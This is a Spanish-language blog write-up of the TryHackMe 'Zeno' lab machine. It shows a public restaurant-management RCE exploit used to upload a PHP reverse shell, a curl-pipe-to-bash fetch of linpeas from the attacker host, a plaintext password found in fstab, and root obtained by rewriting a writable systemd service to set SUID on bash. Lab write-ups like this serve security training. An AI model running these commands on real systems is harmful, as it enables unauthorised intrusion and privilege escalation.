<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Zeno THM Writeup - </title><meta name="author" content="">
<meta name="author-link" content="">
<meta name="description" content="Zeno WriteUp - Medium Linux Machine from TryHackMe" /><meta name="keywords" content='linux, writeup, medium' /><meta itemprop="name" content="Zeno THM Writeup">
<meta itemprop="description" content="Zeno WriteUp - Medium Linux Machine from TryHackMe"><meta itemprop="datePublished" content="2021-10-25T08:39:53+02:00" />
<meta itemprop="dateModified" content="2021-10-25T08:39:53+02:00" />
<meta itemprop="wordCount" content="959">
<meta itemprop="keywords" content="linux,writeup,medium," /><meta property="og:title" content="Zeno THM Writeup" />
<meta property="og:description" content="Zeno WriteUp - Medium Linux Machine from TryHackMe" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/zeno-thm/zeno-thm/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-25T08:39:53+02:00" />
<meta property="article:modified_time" content="2021-10-25T08:39:53+02:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Zeno THM Writeup"/>
<meta name="twitter:description" content="Zeno WriteUp - Medium Linux Machine from TryHackMe"/>
<meta name="application-name" content="rottenbytes">
<meta name="apple-mobile-web-app-title" content="rottenbytes"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/posts/zeno-thm/zeno-thm/" /><link rel="prev" href="/posts/monitors-htb/monitors-htb/" /><link rel="next" href="/posts/seal-htb/seal-htb/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "Zeno THM Writeup",
    "inLanguage": "",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "\/posts\/zeno-thm\/zeno-thm\/"
    },"genre": "posts","keywords": "linux, writeup, medium","wordcount":  959 ,
    "url": "\/posts\/zeno-thm\/zeno-thm\/","datePublished": "2021-10-25T08:39:53+02:00","dateModified": "2021-10-25T08:39:53+02:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "rottenbytes"
      },"description": "Zeno WriteUp - Medium Linux Machine from TryHackMe"
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title=""><span id="typeit-header-desktop" class="typeit"></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title=""><span id="typeit-header-title-mobile" class="typeit"></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Zeno THM Writeup</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      rottenbytes</span></span>
          <span class="post-category">included in <a href="/categories/writeups/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> writeups</a>&ensp;<a href="/categories/thm/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> thm</a></span></div>
      <div class="post-meta-line"><span title="published on 2021-10-25 08:39:53"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2021-10-25">2021-10-25</time></span>&nbsp;<span title="Updated on 2021-10-25 08:39:53"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2021-10-25">2021-10-25</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>959 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="lazy" src="../assets/posts/zeno/zeno_banner.png" srcset="/../assets/posts/zeno/zeno_banner.png, ../assets/posts/zeno/zeno_banner.png 1.5x, /../assets/posts/zeno/zeno_banner.png 2x" sizes="auto" data-title="Zeno WriteUp - Medium Linux Machine from TryHackMe" data-alt="/../assets/posts/zeno/zeno_banner.png" width="725" height="98" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#enumeración">Enumeración</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#enumeración-http---p12340-tcp">Enumeración HTTP - p.12340 (TCP)</a></li>
      </ul>
    </li>
    <li><a href="#explotación">Explotación</a>
      <ul>
        <li><a href="#usertxt">user.txt</a></li>
      </ul>
    </li>
    <li><a href="#priv-esc">Priv. Esc.</a>
      <ul>
        <li><a href="#roottxt">root.txt</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 id="enumeración">Enumeración</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
12340/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
|_http-title: We&amp;<span style="color:#75715e">#39;ve got some trouble | 404 - Resource not found</span>
</code></pre></div><p>Viendo que solamente hay dos puertos abiertos, asumo que la entrada será a través del puerto 12340, el cual está corriendo un Apache.</p>
<h3 id="enumeración-http---p12340-tcp">Enumeración HTTP - p.12340 (TCP)</h3>
<p><img loading="lazy" src="../assets/posts/zeno/http.png" srcset="/../assets/posts/zeno/http.png, ../assets/posts/zeno/http.png 1.5x, /../assets/posts/zeno/http.png 2x" sizes="auto" data-title="/../assets/posts/zeno/http.png" data-alt="/../assets/posts/zeno/http.png" width="1423" height="860" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>
Al mismo acceder al servicio web nos encontramos con una simple página que no contiene nada.
Wappalyzer no nos indica nada, al igual que <em>nikto</em>, así que voy a tratar de fuzzear la web a ver si consigo descubrir algún directorio interesante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -c -u http://10.10.161.249:12340/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.php,.old,.bak,.html -t <span style="color:#ae81ff">100</span>
 
 
        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       

       v1.3.1 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.161.249:12340/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .txt .php .old .bak .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : <span style="color:#ae81ff">10</span>
 :: Threads          : <span style="color:#ae81ff">100</span>
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.html              <span style="color:#f92672">[</span>Status: 200, Size: 3897, Words: 120, Lines: 15<span style="color:#f92672">]</span>
rms                     <span style="color:#f92672">[</span>Status: 301, Size: 239, Words: 14, Lines: 8<span style="color:#f92672">]</span>
</code></pre></div><p>Al acceder al directorio que hemos descubierto vemos que se trata de una página de un hotel <em>Pathfinder Hotel Restaurant Management System</em></p>
<p><img loading="lazy" src="../assets/posts/zeno/rms.png" srcset="/../assets/posts/zeno/rms.png, ../assets/posts/zeno/rms.png 1.5x, /../assets/posts/zeno/rms.png 2x" sizes="auto" data-title="/../assets/posts/zeno/rms.png" data-alt="/../assets/posts/zeno/rms.png" width="1377" height="973" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<p>Buscando exploits públicos, encontramos uno asociado con &ldquo;<em>Restaurant Management System</em>&rdquo;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ searchsploit Restaurant Management System
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Restaurant Management System 1.0 - Remote Code Execution                                                                                                                         | php/webapps/47520.py
</code></pre></div><h2 id="explotación">Explotación</h2>
<h3 id="usertxt">user.txt</h3>
<p><em>Searchsploit</em> nos muestra un <em>RCE</em>, así que vamos a ver de qué se trata.</p>
<ul>
<li>Exploit code: <a href="https://www.exploit-db.com/exploits/47520"target="_blank" rel="external nofollow noopener noreferrer">Restaurant Management System 1.0 - Remote Code Execution</a></li>
</ul>
<p>Analizando el código podemos ver que simplemente se trata de una subida de una <em>web shell</em> simple en PHP.
Asumiendo que podemos ejecutar código en PHP, voy a modificar el exploit para subir esta <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"target="_blank" rel="external nofollow noopener noreferrer">reverse shell</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py http://10.10.161.249:12340/rms/

    _  _   _____  __  __  _____   ______            _       _ _
  _| <span style="color:#f92672">||</span> |_|  __ <span style="color:#ae81ff">\|</span>  <span style="color:#ae81ff">\/</span>  |/ ____| |  ____|          | |     <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span> |
 |_  __  _| |__<span style="color:#f92672">)</span> | <span style="color:#ae81ff">\ </span> / | <span style="color:#f92672">(</span>___   | |__  __  ___ __ | | ___  _| |_
  _| <span style="color:#f92672">||</span> |_|  _  /| |<span style="color:#ae81ff">\/</span>| |<span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span> |  __| <span style="color:#ae81ff">\ \/</span> / <span style="color:#e6db74">&#39;_ \| |/ _ \| | __|
</span><span style="color:#e6db74"> |_  __  _| | \ \| |  | |____) | | |____ &gt;  &lt;| |_) | | (_) | | |_
</span><span style="color:#e6db74">   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
</span><span style="color:#e6db74">                                             | |
</span><span style="color:#e6db74">                                             |_|
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Credits : All InfoSec (Raja Ji&#39;</span>s<span style="color:#f92672">)</span> Group
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Restaurant Management System Exploit, Uploading Shell
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Shell Uploaded. Please check the URL : http://10.10.161.249:12340/rms/images/reverse-shell.php
</code></pre></div><p>Una vez ejecutado el exploit, le hacemos un curl a la ruta donde está nuestra <em>reverse shell</em> y ponemos un puerto a la escucha para conseguir la shell.
Conseguido el acceso a la máquina, upgradeamos la shell para hacerla totalmente interactiva.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -lvnp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.8.123.164<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.161.249<span style="color:#f92672">]</span> <span style="color:#ae81ff">50876</span>
Linux zeno 3.10.0-1160.36.2.el7.x86_64 <span style="color:#75715e">#1 SMP Wed Jul 21 11:57:15 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
 12:19:46 up <span style="color:#ae81ff">42</span> min,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>system_u:system_r:httpd_t:s0
sh-4.2$ tty
tty
not a tty
sh-4.2$ which python
which python
/usr/bin/python
sh-4.2$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
<span style="color:#f92672">[</span>Ctrl + Z<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+  Stopped                 nc -lvnp <span style="color:#ae81ff">9001</span>
$ stty raw -echo
<span style="color:#f92672">[</span>fg<span style="color:#f92672">]</span>
bash-4.2$ export TERM<span style="color:#f92672">=</span>xterm
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.2$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
edward:x:1000:1000::/home/edward:/bin/bash
</code></pre></div><p>Podemos ver que existen dos usuarios en la máquina, por defecto <code>root</code> y el usuario <code>edward</code>.</p>
<p>Voy a comenzar enumerando la máquina automáticamente con <a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh"target="_blank" rel="external nofollow noopener noreferrer">linpeas</a>, así que lo transfiero a la máquina abriendo un servidor web con python3 (<code>python3 -m http.server 80</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.2$ curl 10.8.123.164/linpeas.sh | bash      

...SNIP...

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Permissions in init, init.d, systemd, and rc.d                                                       
<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d             
You have write privileges over /etc/systemd/system/zeno-monitoring.service                               
                                                                                                         
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Hashes inside passwd file? ........... No                                                            
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Writable passwd file? ................ No                                                            
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share       /mnt/secret-sharecifs    _netdev,vers<span style="color:#f92672">=</span>3.0,ro,username<span style="color:#f92672">=</span>zeno,password<span style="color:#f92672">=</span>FrobjoodAdkoonceanJa,domain<span style="color:#f92672">=</span>localdomain,soft <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  
...SNIP...
</code></pre></div><p><em>LinPeas</em> nos muestra que tenemos privilegios de escrituria en <code>/etc/systemd/system/zeno-monitoring.service</code> y además, nos muestra una contraseña <code>password=FrobjoodAdkoonceanJa</code>.</p>
<p>Probando esta contraseña con el usuario <code>edward</code> a través de <em>SSH</em>, podemos acceder a la máquina.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh edward@10.10.161.249

<span style="color:#f92672">[</span>edward@zeno ~<span style="color:#f92672">]</span>$ cat user.txt 
THM<span style="color:#f92672">{</span>070cab2c9dc*********************<span style="color:#f92672">}</span>
</code></pre></div><h2 id="priv-esc">Priv. Esc.</h2>
<h3 id="roottxt">root.txt</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>edward@zeno ~<span style="color:#f92672">]</span>$ sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
</span><span style="color:#e6db74">    LC_CTYPE&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
</span><span style="color:#e6db74">    XAUTHORITY&#34;</span>, secure_path<span style="color:#f92672">=</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin

User edward may run the following commands on zeno:
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/reboot
</code></pre></div><p>Simplemente comprobando los privilegios de <code>edward</code> podemos ver que tenemos la capacidad de  reiniciar la máquina sin proporcionar credenciales de <code>root</code>, además, podemos modificar <code>/etc/systemd/system/zeno-monitoring.service</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>edward@zeno ~<span style="color:#f92672">]</span>$ cat /etc/systemd/system/zeno-monitoring.service

<span style="color:#f92672">[</span>Unit<span style="color:#f92672">]</span>
Description<span style="color:#f92672">=</span>Zeno monitoring

<span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
Type<span style="color:#f92672">=</span>simple
User<span style="color:#f92672">=</span>root
ExecStart<span style="color:#f92672">=</span>/root/zeno-monitoring.py

<span style="color:#f92672">[</span>Install<span style="color:#f92672">]</span>
WantedBy<span style="color:#f92672">=</span>multi-user.target
</code></pre></div><p>Vemos que este servicio está ejecutando un script en python, así que vamos a modificarlo para que cuando se ejecute darle permisos de <em>SUID</em> al binario de bash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>edward@zeno ~<span style="color:#f92672">]</span>$ vim /etc/systemd/system/zeno-monitoring.service

<span style="color:#f92672">[</span>Unit<span style="color:#f92672">]</span>
Description<span style="color:#f92672">=</span>Zeno monitoring

<span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
Type<span style="color:#f92672">=</span>simple
User<span style="color:#f92672">=</span>root
ExecStart<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#39;chmod +s /bin/bash&#39;</span>

<span style="color:#f92672">[</span>Install<span style="color:#f92672">]</span>
WantedBy<span style="color:#f92672">=</span>multi-user.target
</code></pre></div><p>Una vez modificado, reiniciamos la máquina y esperamos para volver a conectarnos a través de <em>SSH</em> con el usuario <code>edward</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh edward@10.10.161.249
bash-4.2$ ls -la /bin/bash
-rwsr-sr-x. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">964536</span> Apr  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2020</span> /bin/bash
bash-4.2$ /bin/bash -p
bash-4.2# whoami <span style="color:#f92672">&amp;&amp;</span> cat /root/root.txt
root
THM<span style="color:#f92672">{</span>b187ce4b852325******************<span style="color:#f92672">}</span>
</code></pre></div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2021-10-25 08:39:53">Updated on 2021-10-25&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"></div>
      <div class="post-info-share">
        <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/zeno-thm/zeno-thm/" data-title="Zeno THM Writeup" data-via="jagelit0" data-hashtags="linux,writeup,medium"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/posts/zeno-thm/zeno-thm/" data-hashtag="linux"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="/posts/zeno-thm/zeno-thm/" data-title="Zeno THM Writeup" data-image="../assets/posts/zeno/zeno_banner.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/linux/' class="post-tag">linux</a><a href='/tags/writeup/' class="post-tag">writeup</a><a href='/tags/medium/' class="post-tag">medium</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/monitors-htb/monitors-htb/" class="post-nav-item" rel="prev" title="Monitors HTB Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Monitors HTB Writeup</a>
      <a href="/posts/seal-htb/seal-htb/" class="post-nav-item" rel="next" title="Seal HTB Writeup">Seal HTB Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line custom">[rottenbytes]</div><div class="footer-line statistics"></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"data":{"typeit-header-desktop":"\u003e rottenbytes","typeit-header-title-mobile":"\u003e 